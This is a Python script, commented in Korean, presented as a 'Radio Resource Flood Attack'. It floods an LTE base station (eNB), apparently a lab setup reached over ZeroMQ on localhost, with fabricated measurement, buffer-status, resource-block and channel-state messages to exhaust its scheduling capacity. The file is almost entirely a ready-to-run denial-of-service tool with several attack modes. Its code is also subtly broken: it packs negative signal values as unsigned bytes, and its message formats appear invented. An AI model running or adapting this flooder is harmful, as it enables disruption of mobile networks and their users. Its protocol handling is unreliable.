#!/usr/bin/env python3
"""
Radio Resource Flood Attack
무선 자원 관리 시스템을 공격하여 eNB의 스케줄링 리소스를 고갈시키는 공격
"""

import zmq
import struct
import time
import threading
import random
from datetime import datetime

class RadioResourceFlood:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        self.attack_threads = []
        
    def create_measurement_report(self, ue_id):
        """RRC Measurement Report 메시지 생성 (무선 자원 스케줄링 유발)"""
        message = struct.pack('>H', 0x0005)  # Message Type: RRC Measurement Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 측정값 포함 (스케줄링 알고리즘 부담 증가)
        for i in range(20):  # 20개 셀 측정값
            message += struct.pack('>H', random.randint(1, 65535))  # Cell ID
            message += struct.pack('>B', random.randint(-120, -50))  # RSRP
            message += struct.pack('>B', random.randint(-20, 0))   # RSRQ
            message += struct.pack('>B', random.randint(0, 100))   # SINR
        
        return message
    
    def create_buffer_status_report(self, ue_id):
        """Buffer Status Report 생성 (무선 자원 요청)"""
        message = struct.pack('>H', 0x0006)  # Message Type: Buffer Status Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 버퍼 상태 정보
        for i in range(10):  # 10개 버퍼 그룹
            message += struct.pack('>B', i)  # Buffer Group ID
            message += struct.pack('>I', random.randint(0, 1000000))  # Buffer Size
            message += struct.pack('>B', random.randint(0, 255))  # Priority
        
        return message
    
    def create_power_headroom_report(self, ue_id):
        """Power Headroom Report 생성 (무선 자원 관리)"""
        message = struct.pack('>H', 0x0007)  # Message Type: Power Headroom Report
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 복잡한 전력 정보
        message += struct.pack('>B', random.randint(0, 63))  # Power Headroom
        message += struct.pack('>B', random.randint(0, 63))  # PUSCH Power
        message += struct.pack('>B', random.randint(0, 63))  # PUCCH Power
        message += struct.pack('>B', random.randint(0, 63))  # SRS Power
        
        return message
    
    def create_prb_request(self, ue_id):
        """PRB (Physical Resource Block) 요청 메시지 생성"""
        message = struct.pack('>H', 0x0008)  # Message Type: PRB Request
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 다수의 PRB 요청
        for i in range(15):  # 15개 PRB 요청
            message += struct.pack('>H', random.randint(1, 100))  # PRB Count
            message += struct.pack('>B', random.randint(1, 10))  # Priority
            message += struct.pack('>B', random.randint(0, 255))  # QoS Class
            message += struct.pack('>I', random.randint(1000, 10000))  # Data Size
        
        return message
    
    def create_channel_state_info(self, ue_id):
        """Channel State Information 생성 (무선 자원 최적화)"""
        message = struct.pack('>H', 0x0009)  # Message Type: Channel State Info
        message += struct.pack('>I', ue_id)  # UE Identity
        
        # 복잡한 채널 상태 정보
        for i in range(25):  # 25개 서브캐리어
            message += struct.pack('>H', i)  # Subcarrier Index
            message += struct.pack('>B', random.randint(-30, 0))  # Channel Gain
            message += struct.pack('>B', random.randint(0, 100))  # SNR
            message += struct.pack('>B', random.randint(0, 100))  # CQI
        
        return message
    
    def send_message(self, message, message_type):
        """메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f'tcp://localhost:{self.target_port}')
            
            socket.send(message, zmq.NOBLOCK)
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type}: {len(message)} bytes")
            
            socket.close()
            return True
            
        except Exception as e:
            print(f"메시지 전송 오류: {e}")
            return False
    
    def measurement_flooding(self, num_ues=50, duration=60):
        """측정 보고 플러딩 (무선 자원 스케줄링 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 측정 보고
                for ue_id in range(num_ues):
                    measurement = self.create_measurement_report(1000 + ue_id)
                    self.send_message(measurement, f"Measurement Report UE {ue_id}")
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.05)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"측정 플러딩 오류: {e}")
                time.sleep(1)
    
    def resource_request_flooding(self, num_ues=30, duration=60):
        """자원 요청 플러딩 (PRB 스케줄링 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 자원 요청
                for ue_id in range(num_ues):
                    # Buffer Status Report
                    buffer_report = self.create_buffer_status_report(1000 + ue_id)
                    self.send_message(buffer_report, f"Buffer Status UE {ue_id}")
                    
                    # PRB Request
                    prb_request = self.create_prb_request(1000 + ue_id)
                    self.send_message(prb_request, f"PRB Request UE {ue_id}")
                    
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.1)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"자원 요청 플러딩 오류: {e}")
                time.sleep(1)
    
    def channel_state_flooding(self, num_ues=40, duration=60):
        """채널 상태 플러딩 (무선 자원 최적화 공격)"""
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 다수 UE가 동시에 채널 상태 보고
                for ue_id in range(num_ues):
                    # Channel State Information
                    channel_info = self.create_channel_state_info(1000 + ue_id)
                    self.send_message(channel_info, f"Channel State UE {ue_id}")
                    
                    # Power Headroom Report
                    power_report = self.create_power_headroom_report(1000 + ue_id)
                    self.send_message(power_report, f"Power Headroom UE {ue_id}")
                    
                    time.sleep(0.001)  # 매우 짧은 간격
                
                time.sleep(0.08)  # 다음 라운드까지 대기
                
            except Exception as e:
                print(f"채널 상태 플러딩 오류: {e}")
                time.sleep(1)
    
    def start_attack(self, attack_type="measurement", num_ues=50, duration=60):
        """공격 시작"""
        print(f"=== Radio Resource Flood Attack 시작 ===")
        print(f"공격 유형: {attack_type}")
        print(f"UE 수: {num_ues}")
        print(f"지속 시간: {duration}초")
        print(f"대상 포트: {self.target_port}")
        print("=" * 50)
        
        self.running = True
        
        if attack_type == "measurement":
            # 측정 보고 플러딩
            thread = threading.Thread(target=self.measurement_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "resource":
            # 자원 요청 플러딩
            thread = threading.Thread(target=self.resource_request_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "channel":
            # 채널 상태 플러딩
            thread = threading.Thread(target=self.channel_state_flooding, args=(num_ues, duration))
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
            
        elif attack_type == "mixed":
            # 혼합 공격
            thread1 = threading.Thread(target=self.measurement_flooding, args=(num_ues//3, duration))
            thread2 = threading.Thread(target=self.resource_request_flooding, args=(num_ues//3, duration))
            thread3 = threading.Thread(target=self.channel_state_flooding, args=(num_ues//3, duration))
            
            thread1.daemon = True
            thread2.daemon = True
            thread3.daemon = True
            
            thread1.start()
            thread2.start()
            thread3.start()
            
            self.attack_threads.extend([thread1, thread2, thread3])
        
        # 공격 지속 시간 대기
        time.sleep(duration)
        self.stop_attack()
    
    def stop_attack(self):
        """공격 중지"""
        print("\n=== 공격 중지 ===")
        self.running = False
        
        # 스레드 종료 대기
        for thread in self.attack_threads:
            thread.join(timeout=1)
        
        # ZeroMQ 정리
        self.context.term()
        print("공격 완료")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Radio Resource Flood Attack')
    parser.add_argument('--attack-type', choices=['measurement', 'resource', 'channel', 'mixed'], 
                       default='measurement', help='공격 유형')
    parser.add_argument('--num-ues', type=int, default=50, help='UE 수')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
    
    args = parser.parse_args()
    
    attack = RadioResourceFlood(args.target_port)
    
    try:
        attack.start_attack(args.attack_type, args.num_ues, args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attack.stop_attack()

if __name__ == "__main__":
    main()
